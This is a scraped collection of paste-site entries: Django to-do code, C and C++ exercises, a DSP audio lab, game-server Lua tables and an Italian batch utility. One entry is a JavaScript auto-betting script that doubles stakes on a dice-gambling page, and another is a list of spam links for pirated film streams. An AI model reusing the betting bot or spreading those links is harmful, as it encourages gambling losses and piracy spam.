                <ul class=""list-group list-group-flush overflow-auto"" style=""max-height: 300px;"">
                    
                    {% for item in todos %}

                        <li class=""list-group-item d-flex justify-content-between"">
                            <a href="""" class=""btn btn-outline-danger"">Delete</a>

                            {% if item.status %}

                                <p class=""my-auto"">
                                    <del>{{ item.text }}</del>
                                </p>
                                <a href=""{% url 'todo-update' item.id %}"" class=""btn btn-outline-primary"">Redo</a>

                            {% else %}

                                <p class=""my-auto"">{{ item.text }}</p>
                                <a href=""{% url 'todo-update' item.id %}"" class=""btn btn-outline-secondary"">Done</a>

                            {% endif %}

                            
                        </li>

                    {% endfor %}

                </ul>
            </div>
        </div>
    </main>

    <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"" integrity=""sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"" crossorigin=""anonymous""></script>       
</body>
</html>"
KNNXAchL,Untitled,MeehoweCK,C++,Friday 24th of May 2024 10:03:14 AM CDT,"// main.cpp
#include ""pracownikidyrektor.h""
#include <vector>
#include <algorithm>
#include <ctime>

int main()
{
//    Pracownik jan(""Jan"", ""Kowalski"", ""stazysta"", 1500);
//    jan.wypiszDane();
//
//    Dyrektor anna(0, ""Anna"", ""Lis"", ""dyrektor"", 3000);
//    anna.wypiszDane();
//
//    Dyrektor Jan(500, jan);
//    Jan.wypiszDane();
//
//    /*Pracownik* p1{ &anna };
//    p1->setDodatekFunkcyjny(400);*/
//
//    // setDodatekFunkcyjny jest metodą zdefiniowaną wyłącznie dla klasy pochodnej (Dyrektor) i nie jest zdefiniowana dla klasy bazowej (Pracownik).
//    // oznacza to, że ta metoda może zostać wywołana tylko dla wskaźników typu Dyrektor* lub referencji Dyrektor&.
//    // W powyższym przykładzie p1 jest wskaźnikiem na klasę bazową (Pracownik*), więc ta metoda nie może zostać wywołana
//    // Poniżej definiujemy p1 jako wskaźnik na klasę potomną (Dyrektor*), a klasa Dyrektor posiada składową metodę setDodatekFunkcyjny, więc może ona zostać wywołana:
//
//    Dyrektor* p1{ &anna };
//    p1->setDodatekFunkcyjny(400);
//
//    Pracownik p3{ ""Andrzej"", ""Nowak"", ""aplikant"", 2000 };
//    //Dyrektor& d1{ p3 };

    std::vector<int> w1{ 2, 5, 6, 7 };
    std::vector<int> w2{ 1, 3, 5 };

    w1.insert(w1.end(), w2.begin(), w2.end());      // do obiektu w1 wstaw wszystkie elementy z w2. Wstaw je na koniec wektora {2, 5, 6, 7, 1, 3, 5}
    /*for (auto i : w1) {
        std::cout << i << '\t';
    }
    std::cout << std::endl;*/

    w2.insert(w2.begin() + 1, w1.begin() + 3, w1.begin() + 5);
    /*for (auto i : w2) {
        std::cout << i << '\t';
    }
    std::cout << std::endl;*/

    w2.insert(w2.end(), w1.begin(), w1.end());
    for (auto i : w2) {
        std::cout << i << '\t';
    }
    std::cout << std::endl;
    srand(time(nullptr));
    std::random_shuffle(w2.begin() + 2, w2.begin() + 7);        // ustaw losowo elementy od begin() + 2 do begin() + 6
    for (auto i : w2) {
        std::cout << i << '\t';
    }
    std::cout << std::endl;

    
    return 0;
}"
xGVLcmpq,Untitled,MeehoweCK,C++,Friday 24th of May 2024 10:02:01 AM CDT,"// szablon.h
#pragma once

template <typename T>
class Pointer {
	T* ptr;
public:
	Pointer() : ptr{ nullptr } {}
	Pointer(const T& val) : ptr{ new T{val} } {}
	T getValue() { return *ptr; }
	~Pointer() {
		if (ptr != nullptr) {
			delete ptr;
		}
	}
	void setValue(T val) {
		if (ptr) {
			*ptr = val;
		}
		else {
			ptr = new T{ val };
		}
	}
};"
WbCqfEnA,Untitled,rezamalik15,Python,Friday 24th of May 2024 10:00:21 AM CDT,"from django.shortcuts import render, HttpResponseRedirect
from django.urls import reverse
from .models import Todo

# Create your views here.

def index(request):
    all_todos = Todo.objects.all()
    context = dict(
        todos = all_todos
    )

    return render(request, 'todolist/index.html', context)

def add(request):
    new_todo = request.POST['todo']
    todo = Todo(text=new_todo)
    todo.save()

    return HttpResponseRedirect(reverse('todo-index'))

def update(request, todo_id):
    todo = Todo.objects.get(id=todo_id)
    todo.status = not todo.status
    todo.save()

    return HttpResponseRedirect(reverse('todo-index'))

def delete(request, todo_id):
    pass"
FRWqp46Y,Untitled,rezamalik15,HTML,Friday 24th of May 2024 09:59:49 AM CDT,"{% if item.status %}

    <p class=""my-auto"">
        <del>{{ item.text }}</del>
    </p>
    <a href=""{% url 'todo-update' item.id %}"" class=""btn btn-outline-primary"">Redo</a>

{% else %}

    <p class=""my-auto"">{{ item.text }}</p>
    <a href=""{% url 'todo-update' item.id %}"" class=""btn btn-outline-secondary"">Done</a>

{% endif %}"
VaHpW7uU,lab13,Bobita,C,Friday 24th of May 2024 09:42:10 AM CDT,"/*****************************************************************************
 * lab11.c
 *****************************************************************************/

#include <sys/platform.h>
#include ""adi_initialize.h""
#include ""lab13.h""
#include ""Talkthrough.h""
#include <sysreg.h>
#include <ccblkfn.h>


/*****************************************************************************

Variables

Description:	The variables ChannelxLeftIn and ChannelxRightIn contain
		the data coming from the codec ADC (AD1871).  The (processed)
		playback data are written into the variables
		ChannelxLeftOut and ChannelxRightOut respectively, which
		are then sent back to the DAC (AD1854) in the SPORT0 ISR.

******************************************************************************/
// left input data from AD1871
int iChannel0LeftIn, iChannel1LeftIn;
// right input data from AD1871
int iChannel0RightIn, iChannel1RightIn;
// left ouput data for AD1854
int iChannel0LeftOut, iChannel1LeftOut;
// right ouput data for AD1854
int iChannel0RightOut, iChannel1RightOut;
// SPORT0 DMA transmit buffer
int iTxBuffer1[2];
// SPORT0 DMA receive buffer
int iRxBuffer1[2];

int wr_ptr = 0;
float LFO = 0.0;
float carrerAmplitude = 0.5;
int FS = 44100;
float carrerFrequency = 20.0 / 44100;
float minValue = 1000;
float maxValue = 3000;
float L=1;

int BUFFER_SIZE = 2500;

int circularBuffer[3000];


//--------------------------------------------------------------------------//
// Function:	main														//
//																			//
// Description:	After calling a few initalization routines, main() just 	//
//				waits in a loop forever.  The code to process the incoming  //
//				data can be placed in the function Process_Data() in the 	//
//				file ""Process_Data.c"".										//
//--------------------------------------------------------------------------//
void main(void)
{
	Init_Flags();
	Audio_Reset();
	Init_Sport0();
	Init_DMA();
	Init_Interrupts();
	Enable_DMA_Sport0();

	while(1)
	{
		if(*pPORTFIO & (1 << 2))
		{
			while(*pPORTFIO & (1 << 2));
			L++;
		}

		if(*pPORTFIO & (1 << 3))
		{
			while(*pPORTFIO & (1 << 3));
			L--;
		}
	}
}

"
0Tk6RkgR,trial,coinwalk,JavaScript,Friday 24th of May 2024 09:06:13 AM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe/240).toFixed(8));
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = (OriginalBalanCe*2);
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var loL = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = 0;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if (((BalanCe/20)<=NexTBet)&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe<=(snowzy-tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){ 
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    }
if (((BaseBet*24)<=NexTBet)&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 10);
}
go();"
BCfXZn0t,Untitled,Derik_hacker,C,Friday 24th of May 2024 09:00:21 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <stdlib.h>
#include <stdio.h>


void selectionsort(int arr[], int t_size);

int main(int argc, char** argv) {
    int *matricola = NULL;
    int *esiti = NULL;
    int conta = 0;
    int conta1 = 0;

    if (argc != 3) {
        printf(""Il faut exactement deux paramètres\n"");
        return -1;
    }

    FILE* fp = fopen(argv[1], ""rb"");
    FILE* fp1 = fopen(argv[2], ""r"");

    if (fp == NULL || fp1 == NULL) {
        printf(""Erreur lors de l'ouverture des fichiers\n"");
        return -1;
    }

    matricola = malloc(sizeof(int));
    esiti = malloc(sizeof(int));

    if(matricola == NULL || esiti == NULL) {
        printf(""Erreur lors de l'allocation de la mémoire\n"");
        return -1;
    }

    while (fscanf(fp, ""%d"", &matricola[conta]) != EOF) {
        conta++;
        matricola = realloc(matricola, (conta + 1) * sizeof(int));

        if (matricola == NULL){
            printf(""Erreur lors de la reallocation de la mémoire\n"");
            return -1;
        }
        
        
    }

    
    while (fscanf(fp1, ""%d"", &esiti[conta1]) != EOF) {
        conta1++;
        esiti = realloc(esiti, (conta1 + 1) * sizeof(int));

        if (esiti == NULL){
            printf(""Erreur lors de la reallocation de la mémoire\n"");
            return -1;
        }
        
    }

    fclose(fp);
    fclose(fp1);

    selectionsort(matricola, conta);
    selectionsort(esiti, conta1);

    
    printf(""Matricules et résultats triés :\n"");
    for (int i = 0; i < conta && i < conta1; i++) {
        printf(""%d   %d\n"", matricola[i], esiti[i]);
    }

    
    free(matricola);
    free(esiti);

    return 0;
}

void selectionsort(int arr[], int t_size) {
    int temp;
    for (int i = 0; i < t_size - 1; i++) {
        for (int j = i + 1; j < t_size; j++) {
            if (arr[j] > arr[i]) {
                temp = arr[i];
                arr[i] = arr[j];
                arr[j] = temp;
            }
        }
    }
}
"
85KS58Ut,Untitled,Derik_hacker,C,Friday 24th of May 2024 08:59:46 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <stdlib.h>
#include <stdio.h>
#define MAX_TAILLE_MATR 7

void selectionsort(int arr[], int t_size);

int main(int argc, char** argv) {
    int *matricola = NULL;
    int *esiti = NULL;
    int conta = 0;
    int conta1 = 0;

    if (argc != 3) {
        printf(""Il faut exactement deux paramètres\n"");
        return -1;
    }

    FILE* fp = fopen(argv[1], ""r"");
    FILE* fp1 = fopen(argv[2], ""r"");

    if (fp == NULL || fp1 == NULL) {
        printf(""Erreur lors de l'ouverture des fichiers\n"");
        return -1;
    }

    matricola = malloc(sizeof(int));
    esiti = malloc(sizeof(int));

    if(matricola == NULL || esiti == NULL) {
        printf(""Erreur lors de l'allocation de la mémoire\n"");
        return -1;
    }

    while (fscanf(fp, ""%d"", &matricola[conta]) != EOF) {
        conta++;
        matricola = realloc(matricola, (conta + 1) * sizeof(int));

        if (matricola == NULL){
            printf(""Erreur lors de la reallocation de la mémoire\n"");
            return -1;
        }
        
        
    }

    
    while (fscanf(fp1, ""%d"", &esiti[conta1]) != EOF) {
        conta1++;
        esiti = realloc(esiti, (conta1 + 1) * sizeof(int));

        if (esiti == NULL){
            printf(""Erreur lors de la reallocation de la mémoire\n"");
            return -1;
        }
        
    }

    fclose(fp);
    fclose(fp1);

    selectionsort(matricola, conta);
    selectionsort(esiti, conta1);

    
    printf(""Matricules et résultats triés :\n"");
    for (int i = 0; i < conta && i < conta1; i++) {
        printf(""%d   %d\n"", matricola[i], esiti[i]);
    }

    
    free(matricola);
    free(esiti);

    return 0;
}

void selectionsort(int arr[], int t_size) {
    int temp;
    for (int i = 0; i < t_size - 1; i++) {
        for (int j = i + 1; j < t_size; j++) {
            if (arr[j] > arr[i]) {
                temp = arr[i];
                arr[i] = arr[j];
                arr[j] = temp;
            }
        }
    }
}
"
pyDchBbZ,SDVSRBTNYT,gadungw71,PHP,Friday 24th of May 2024 08:57:26 AM CDT,"•	https://www.imdb.com/list/ls545833912
•	https://www.imdb.com/list/ls545833812/
•	https://www.imdb.com/list/ls545836063
•	https://www.imdb.com/list/ls545836561/
•	https://www.artstation.com/watchplanetadosmacacosoreinado6/profile
•	https://topmate.io/assitir_planeta_dos_macacos/1000798
•	https://www.artstation.com/assistirplanetadosmacacosoreinado20242/profile
•	https://topmate.io/filme_planetados_macacos_2024/1000995
•	https://www.imdb.com/list/ls545839217
•	https://www.imdb.com/list/ls545839497/
•	https://www.imdb.com/list/ls545839935/
•	https://www.artstation.com/assistirfuriosaumasagamadmax20245/profile
•	https://topmate.io/filme_furiosa_uma_saga_madmax/1001066
•	https://www.artstation.com/watchfuriosaumasagamadmaxportugis4/profile
•	https://forum.mush.com.br/topic/218397/wadidaww
•	https://forum.mush.com.br/topic/218398/verradina
•	https://www.kooapp.com/koo/guest_P68S8O/ea9f5fad-c265-4536-9581-f91497c8ed6e
•	https://www.kooapp.com/koo/guest_P68S8O/197f8e84-c67f-4930-a82d-110713fff9bc
•	https://wandering.flarum.cloud/d/65214-papinkaberlinan
•	https://hiuderyy.hashnode.dev/dsefsegseg
•	https://click4r.com/posts/g/16895909/cintakuberahir
•	https://medium.com/@rarawwwuu38/assistir-furiosa-uma-saga-mad-max-filme-completo-dublado-em-portugues-topflix-a509fff24c70
•	https://www.onfeetnation.com/profiles/blogs/namunkini
•	https://namelessmc.com/profile/rarawwwuu38/
•	https://hackmd.io/@rerewilli6/rynBcz0QC
•	https://demo.hedgedoc.org/s/XUxWgNPfW
•	https://rentry.co/wih88onb
•	https://paste.ee/p/AdPbm
•	https://yamcode.com/fbdbtm-102
•	https://start.me/w/llN4a7
•	https://plaza.rakuten.co.jp/aryasantosso/diary/202405240000/
•	https://telegra.ph/DSEFSG-05-24
•	https://muckrack.com/sfsef-segseg/bio
•	https://profile.hatena.ne.jp/cbfnfgny/
•	http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/774185/Default.aspx
•	https://www.fitlynk.com/1716558955F270226
"
eSt14DtX,Chop Shop Cars,Bacon_Space,Lua,Friday 24th of May 2024 08:44:46 AM CDT," { model = 'raiden',        name = 'Coil Raiden',        brand = 'Coil',        price = 53000,   category = 'Electric',         type = 'automobile', shop = 'pdm' },
    { model = 'tampa4',        name = 'Declasse Drift Tampa 2',        brand = 'Declasse',        price = 53000,   category = 'Addon',         type = 'automobile', shop = 'pdm' },
    { model = 'aleutian',      name = 'Vapid Aleutian',                brand = 'Vapid',           price = 22000,    category = 'chopshop',           type = 'automobile', shop = 'pdm' },
    { model = 'asterope2',     name = 'Karin Asterope GZ',             brand = 'Karin',           price = 2500,    category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'baller8',       name = 'Gallivanter Baller ST-D',       brand = 'Gallivanter',     price = 22000,   category = 'chopshop',           type = 'automobile', shop = 'pdm' },
    { model = 'cavalcade3',    name = 'Albany Cavalcade XL',           brand = 'Albany',          price = 22000,   category = 'chopshop',           type = 'automobile', shop = 'pdm' },
    { model = 'dominator9',    name = 'Vapid Dominator GT',            brand = 'Vapid',           price = 23500,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'dorado',        name = 'Bravado Dorado',                brand = 'Bravado',         price = 22000,   category = 'chopshop',           type = 'automobile', shop = 'pdm' },
    { model = 'drifteuros',    name = 'Annis Euros',                   brand = 'Annis',           price = 53000,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'driftfr36',     name = 'Fathom FR36',                   brand = 'Fathom',          price = 10000,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'driftfuto',     name = 'Karin Futo GTX',                brand = 'Karin',           price = 17500,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'driftjester',   name = 'Dinka Jester RR',               brand = 'Dinka',           price = 53000,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'driftremus',    name = 'Annis Remus',                   brand = 'Annis',           price = 53000,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'drifttampa',    name = 'Declasse Drift Tampa',          brand = 'Declasse',        price = 53000,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'driftyosemite', name = 'Declasse Drift Yosemite',       brand = 'Declasse',        price = 23500,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'driftzr350',    name = 'Annis ZR350',                   brand = 'Annis',           price = 53000,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'asterope2',     name = 'Asterope GZ',                   brand = 'Karin',           price = 2500,    category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'impaler5',      name = 'Impaler SZ',                    brand = 'Declasse',        price = 2500,    category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'impaler6',      name = 'Impaler LX',                    brand = 'Declasse',        price = 23500,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'terminus',      name = 'Canis Terminus',                brand = 'Canis',           price = 9000,     category = 'chopshop',        type = 'automobile', shop = 'pdm' },
    { model = 'Vigero3',       name = 'Declasse Vigero ZX',            brand = 'Declasse',        price = 23500,   category = 'chopshop',         type = 'automobile', shop = 'pdm' },
    { model = 'vivanite',      name = 'Karin Vivanite',                brand = 'Karin',           price = 22000,   category = 'chopshop',           type = 'automobile', shop = 'pdm' },
    { model = 'turismo3',      name = 'Grotti Turismo Omaggio',        brand = 'Grotti ',         price = 280000,  category = 'chopshop',          type = 'automobile', shop = 'pdm' },
   "
0Q2ifCEb,owner variable checker rblx,scriptingtales,Lua,Friday 24th of May 2024 08:19:36 AM CDT,"local p = Instance.new(""Part"", workspace)
local decal = Instance.new(""Decal"", p)

local Billboard = Instance.new(""BillboardGui"", p)
local textLabel = Instance.new(""TextLabel"", Billboard)

p.CustomPhysicalProperties = PhysicalProperties.new(9.99 * 10^6, 4, 1)

Billboard.StudsOffset = Vector3.new(0, 5, 0)
Billboard.MaxDistance = math.huge

Billboard.Size = UDim2.new(0, 200, 0, 50)

textLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextStrokeTransparency = 0
textLabel.BackgroundTransparency = 1
textLabel.TextScaled = true
textLabel.Text = owner.Name
textLabel.Size = UDim2.new(1, 0, 1, 0)

p.Size = Vector3.new(4, 4, 4)

"
6Z7vrwSA,usefultools01.cmd,marioq,Batch,Friday 24th of May 2024 08:18:55 AM CDT,"@echo off

setlocal
for /f ""tokens=1,2 delims=:"" %%A in ('chcp') do (
	set ""CHCP_OLD=%%B""
)
chcp 65001 >nul

::::::::::::::::::::::::::::::::::::::::::::::::::::
:::: caratteri speciali > < | & )( ! ^ sono interpretati 
:::: in modo speciale da ""setlocal enabledelayedexpansion""
:::: per lavorare con STRLEN trasformo i caratteri speciali
:::: in caratteri innocui a ""setlocal enabledelayedexpansion""
if /i ""%1"" == ""strlen"" (
	set ""STRLEN=%1""
)

if not defined STRLEN goto :STRLEN_ck_end
REM set ""STR_4_strlen=""§%2§""""

set ""STR_4_strlen_ORI=""§%*§""""
REM ASCI 161 � -The extended ASCII codes,Inverted exclamation mark- https://www.ascii-code.com/ - https://ss64.com/ascii.html
set ""STR_4_strlen_ORI=%STR_4_strlen_ORI:!=�%""
set ""STR_4_strlen=""§%*§""""

REM echo\#start 0 STR_4_strlen==""#%STR_4_strlen%#""

set ""STR_4_strlen=%STR_4_strlen:|=§%""
set ""STR_4_strlen=%STR_4_strlen:>=§%""
set ""STR_4_strlen=%STR_4_strlen:<=§%""
set ""STR_4_strlen=%STR_4_strlen:&=§%""
set ""STR_4_strlen=%STR_4_strlen:!=�%"" & REM ASCI 161 �
set ""STR_4_strlen=%STR_4_strlen:)=§%""
set ""STR_4_strlen=%STR_4_strlen:(=§%""
set ""STR_4_strlen=%STR_4_strlen:^=§%""
set ""STR_4_strlen=%STR_4_strlen:""=§%""
set ""STR_4_strlen=#.%STR_4_strlen%.#""
REM echo\#start 1 STR_4_strlen==%STR_4_strlen%

set ""STR_4_strlen=%STR_4_strlen:#.§§=%""
set ""STR_4_strlen=%STR_4_strlen:§§.#=%""
REM echo\#start 2 STR_4_strlen==%STR_4_strlen%
:STRLEN_ck_end

if not defined STR_4_strlen goto :STRLEN_no
(
	endlocal 
	setlocal enabledelayedexpansion
	set ""STRLEN=%STRLEN%""
	set ""STR_4_strlen_ORI=%STR_4_strlen_ORI%""
	set ""STR_4_strlen=%STR_4_strlen%""
	set ""CHCP_OLD=%CHCP_OLD%""
)
goto :STRLEN_NEXT_start
:STRLEN_no
(
	endlocal
	setlocal enabledelayedexpansion
	set ""CHCP_OLD=%CHCP_OLD%""
)
:STRLEN_NEXT_start
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::: imposto un titolo alla finestrta in modo da poterla riconoscere
set ""THIS_RANDOM=%random%""
title %~n0-%THIS_RANDOM% %username% ""%cd%""
set N=
for /f ""tokens=1,2,3"" %%A in ('tasklist /NH /FI ""WINDOWTITLE eq %~n0-%%THIS_RANDOM%% %%username%%*""') do (
	set /a N+=1
	if !N! EQU 1 (
		set ""B=%%B""
		echo\!B! | findstr /r /c:""^[0-9][0-9]*.$"" >nul 2>&1
		if !errorlevel! EQU 0 (
			set ""THIS_file_pid=!B!""
			REM echo\QQQ ""THIS_file_pid==!THIS_file_pid! A==%%A - B==!B! pid==!THIS_file_pid! - C==%%C ""
		) else (
			set ""THIS_file_pid=%THIS_RANDOM:~2,-2%%date:/=% ""
			REM set ""THIS_file_pid=%THIS_RANDOM:~0,2%dummy%date:/=%""
			REM echo\WWW ""THIS_file_pid==!THIS_file_pid! A==%%A - B==!B! pid==!THIS_file_pid! - C==%%C""
		)
	)
)
title %~n0-%THIS_file_pid%-%THIS_RANDOM% %username% ""%cd%""
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

set ""THIS_file=%~nx0""
set ""THIS_file=%THIS_file:""=%""
set ""THIS_file_size=%~z0""
set ""THIS_file_date=%~t0""
:::: se ""THIS_file_size"" è definita, il valore di ""%~dp0"" è il percorso reale del file.
:::: se ""THIS_file_size"" non è definita, il valore di ""%~dp0"" è il percorco della directory al prompt che invoca lo script.
:::: -|Strano comportamento, se ""%THIS_file%"" è in un percorso in ""path"" e viene invocato il nome tra vergolette ""nomeFile.cmd""
:::: -|""%~dp0"" prende il valore della directory corrente e non della dir che contiene il ""nomeFile.cmd""
:::: -|""THIS_file_size=%~z0"" e ""THIS_file_date=%~t0"" sono valorizzate se ""%~dp0"" è il percorso reale a ""nomeFile.cmd""
:::: if not [%cd%\]==[%~dp0] set ""THIS_file_path=%~dp0""

if defined THIS_file_size set ""THIS_file_path=%~dp0""
set ""THIS_file_full_path=%THIS_file_path%%THIS_file%""

:::: echo\-----------""cd=%cd%"" ""~dp0=%~dp0""
:::: echo\-----------""THIS_file=%THIS_file%""
:::: echo\-----------""THIS_file_path=%THIS_file_path%""
:::: echo\-----------""THIS_file_size=%THIS_file_size%""
:::: echo\-----------""THIS_file_date=%THIS_file_date%""
:::: echo\-----------""THIS_file_full_path=%THIS_file_path%%THIS_file%""
:::: echo\----------- 0=%0  0~=%~0 p=%~p0  

set ""ALL_0arg=""%1""""

set ""TIME_start=%time%""
set ""ERROR=""
::::::::::::
:::: set ""ESC="" & REM notepad++ ""alt+27""
for /F ""tokens=1,2 delims=#"" %%a in ('""prompt #$H#$E# & echo on & for %%b in (1) do rem""') do ( set ""ESC=%%b"" )
set ""C_RED=%ESC%^[91m"" & REM Testo Rosso
set ""C__=%ESC%^[4m"" & REM Sottolineato
set ""C_0=%ESC%^[0m"" & REM Reset color
:::::::::::

set ""RESET_all_var=for /f ""delims=^="" %%Z in ^('@set my_'^) do @set ""%%Z="" ""
:::: Il carattere § viene sostituito da %LF% ""echo %MSG:§=!LF!%""

set ""MSG=-visualizza con ^""set my_^"" §-resetta, elimina tutte le var ^""my_^"" §* %RESET_all_var% §- exit %%errorlevel%% EQU-Uguale 0 -successo- §- exit %%errorlevel%% GEQ-Maggiore o uguale a 1 -errore-""
::::::::::
:::: imposto Line-Fedd
:::: dopo LF=^ 2 righe vuote da non eliminare
set LF=^


::::::::::::::::::
if exist ""%THIS_file_path%UnxUtils\tr.exe"" (
	set ""TR_exe=%THIS_file_path%UnxUtils\tr.exe""
)
if exist ""%THIS_file_path%cmdow.exe"" (
	set ""CMDOW_exe=%THIS_file_path%cmdow.exe""
)
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

if ""%~1""=="""" (
	set ""ERROR_start=Manca il parametro corretto""
	call :HEADER
	call :SOS_all
	call :FOOTER
)
:::::::::::::::::::
if /i ""%~1""==""my_ip4"" (
	call :HEADER
	goto :%~1
)
if /i ""%~1""==""ip4"" (
	call :HEADER
	goto :my_ip4
)
:::::::::::::::::::

if /i ""%~1""==""where_is_ff"" (
	call :HEADER
	goto :%~1
)
if /i ""%~1""==""my_date"" (
	call :HEADER
	goto :%~1
)

if /i ""%~1""==""geoip"" (
	call :HEADER
	goto :%~1
)

if /i ""%~1""==""user_is_admin"" (
	call :HEADER
	goto :%~1
)

if /i ""%~1""==""run_as_admin"" (
	call :HEADER
	goto :%~1
)

if /i ""%~1""==""NIC"" (
	call :HEADER
	goto :%~1
)

if /i ""%~1""==""strlen"" (
	call :HEADER
	goto :%~1
)

if /i ""%~1""==""-h"" set ""SOS=-h""
if /i ""%~1""==""/h"" set ""SOS=/h""
if /i ""%~1""==""h"" set ""SOS=h""
if /i ""%~1""==""/?"" set ""SOS=/?""
if /i ""%~1""==""-?"" set ""SOS=-?""
if /i ""%~1""==""?"" set ""SOS=^?""
if defined SOS (
	set ""H_P2=%~2""
	call :HEADER
	if defined H_P2 (
		for /f ""tokens=*"" %%A in ( 'findstr /r /x /c:""^[:][A-Z_0-9].*_sos$"" ""%THIS_file_full_path%""' ) do (
			set ""X=%%A""
			set ""X=!X::=!""
			set ""X=!X:_sos=!""
			if /i ""!X!""==""!H_P2!"" (
				set ""ERROR_help=sos per ""!H_P2!""""
				if !X!§==RUN_AS_ADMIN§ set Xopt=NO_CMDOW_exe
				call %%A !X! !Xopt!
				echo\::------
				echo\::%MSG:§=!LF!::%
				call :FOOTER
				exit /b %ERROR%
			)
		)
		if /i ""!H_P2!""==""all"" (
			set ""ERROR_help=sos per ""!H_P2!""...""
			for /f ""tokens=*"" %%A in ( 'findstr /r /x /c:""^[:][A-Z_0-9].*_sos$"" ""%THIS_file_full_path%""' ) do (
				set ""X=%%A""
				set ""X=!X::=!""
				set ""X=!X:_sos=!""
				call %%A !X!
				echo\::------
			)
			echo\::%MSG:§=!LF!::%
			call :FOOTER
			exit /b %ERROR%
		)
	) 
	if not defined H_P2 (
		REM set ""ERROR_parametro_-h=""%1"" richiede valore""
		set ""ERROR_parametro_%SOS%=""%1"" richiede valore""
		echo\::* %THIS_file% %1 
		echo\::  -richiede parametro... .. .
		for /f ""tokens=*"" %%A in ( 'findstr /r /x /c:""^[:][A-Z_0-9].*_sos$"" ""%THIS_file_full_path%""' ) do (
			set ""X=%%A""
			set ""X=!X::=!""
			set ""X=!X:_sos=!""
			echo\::    !X!
		)
		call :FOOTER
		exit /b %ERROR%
	)
	if not ""!H_P2!""=="""" (
		set ""ERROR_parametro_%SOS%=^""!H_P2!^"" non valido^""
		echo\::* %THIS_file% %1 !H_P2!
		echo\::  PARAMETRO ""!H_P2!"" non valido
		set N=
		for /f ""tokens=*"" %%A in ( 'findstr /r /x /c:""^[:][A-Z_0-9].*_sos$"" ""%THIS_file_full_path%"" ^| sort' ) do (
			set /a N+=1
			set ""X=%%A""
			set ""X=!X::=!""
			set ""X=!X:_sos=!""
			if !N! EQU 1 (
				echo\::  prova %1 !X!
			) else (
				echo\::        %1 !X!
			)
		)
		call :FOOTER
		exit /b %ERROR%
	)
)


if not ""%~1""=="""" (
	set ""ERROR_parametro=Parametro ""%~1"" non valido ""
	call :HEADER
	call :SOS_all
	call :FOOTER
	exit /b %ERROR%
)

::::
::::
::::

:START 

REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
REM :::::::::::  modello per nuove funzioni  ::::::::::::::::::::::::::::::::
REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
REM :::::::::::::: my_function ::::::::::::::::::::::::::::::::::::::::::::::
REM :::::::::::::: my_function ::::::::::::::::::::::::::::::::::::::::::::::
REM goto :function_end
REM :function
REM :FUNCTION_sos
REM if not ""%~0""=="":FUNCTION_sos"" goto :function_sos_end
	REM echo\::* %THIS_file% %C__%%~1%C_0% .
	REM echo\:: la funzione di sos deve iniziare con ""^[:][A-Z0-9]*[_].*""
	REM echo\::                    deve finire con "".*_sos$""
	REM echo\:: scrivi qui sos per my_function
	REM echo\::
	REM echo\::
